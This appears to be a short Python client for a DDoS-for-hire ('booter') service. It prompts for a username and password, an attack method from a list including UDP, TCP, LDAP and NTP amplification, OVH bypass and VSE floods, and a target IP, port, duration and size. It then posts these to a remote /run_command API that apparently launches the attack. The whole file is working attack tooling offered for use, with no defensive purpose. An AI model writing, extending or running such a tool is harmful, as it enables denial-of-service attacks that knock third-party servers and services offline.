import requests

validMethod = False

methods = ["UDP", "TCP", "LDAP", "NTP", "STD", "HEX", "HTTP", "OVH-HTTP", "OVH-GAME", "VSE"]

apiurl = "PUT API IP OR URL HERE"
authkey = "PUT API KEY THAT YOU SET IN API.PY HERE"

username = input("Username > ")
password = input("Password > ")
print("")
method = input("Method > ")

if(methods.__contains__(method)):
    validMethod = True

while validMethod == False:
    method = input("Method > ")
    if(methods.__contains__(method)):
        validMethod = True

ip = input("IP > ")
port = input("Port > ")
time = input("Time > ")
size = input("Size > ")

url = "https://" + apiurl + "/run_command?auth_key=" + authkey + "&username=" + username + "&password=" + password + "&method=" + method + "&ip=" + ip + "&port=" + port + "&time=" + time + "&size=" + size

print(url)

response = requests.post(url)

if response.status_code == 200:
    print("Successfully sent the POST request")
    print(response.text)
else:
    print("Failed to send the POST request")
    print(response.status_code)